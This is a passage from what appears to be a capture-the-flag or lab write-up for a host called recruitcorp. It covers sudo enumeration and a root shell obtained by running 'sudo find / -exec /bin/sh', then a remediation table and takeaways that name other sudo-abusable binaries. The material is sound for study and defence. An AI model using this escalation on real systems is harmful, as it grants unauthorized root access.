5. PRIVILEGE ESCALATION
--------------------------------------------------------------------------------

5.1 ENUMERATION
    sudo -l

    Matching Defaults entries for jford on recruitcorp:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
        use_pty

    User jford may run the following commands on recruitcorp:
        (root) NOPASSWD: /usr/bin/find

5.2 WHY THIS IS VULNERABLE
    find is a well-known GTFOBin. Its -exec flag runs arbitrary
    binaries, and because find itself is executed via sudo, the child
    process inherits root privileges. secure_path and env_reset do NOT
    mitigate this - the vulnerability is in the binary's own
    functionality, not environment inheritance.

5.3 ROOT SHELL
    sudo /usr/bin/find / -exec /bin/sh \; -quit

    # id
    uid=0(root) gid=0(root) groups=0(root)

5.4 ROOT FLAG

7. REMEDIATION
--------------------------------------------------------------------------------

    Finding                          | Fix
    ---------------------------------+---------------------------------------------
    SQLi in /admin/ login            | Parameterize queries / prepared statements
    Plaintext passwords in app.db    | Store bcrypt/argon2 hashes only
    Command injection in ping.php    | Allowlist host (regex ^[a-zA-Z0-9.\-]+$),
                                     | use escapeshellarg
    World-readable SQLite DB         | chmod 600, root:root
    NOPASSWD find in sudoers         | Remove; if needed, use a wrapper script
                                     | with fixed arguments
    Weak password (spring2026!)      | Enforce policy + rotate
    Config leak                      | Move secrets out of the web root

--------------------------------------------------------------------------------
8. KEY TAKEAWAYS
--------------------------------------------------------------------------------

    - Look at source code, not just output. The SQLite path and hash
      were only visible by reading index.php.
    - Notes fields are gold. sysmaint-checks/ping.php was the pivot
      to RCE.
    - SQLite dumps are often decoys. Don't assume every credential is
      the one; the real SSH password came from web scraping.
    - sudo find is always root. -exec, -execdir, and -ok all spawn
      child processes as root here. Same class of risk applies to
      vim, less, awk, tar, nmap --script, etc.
    - GTFOBins is the first stop for any sudo -l result you don't
      recognize.
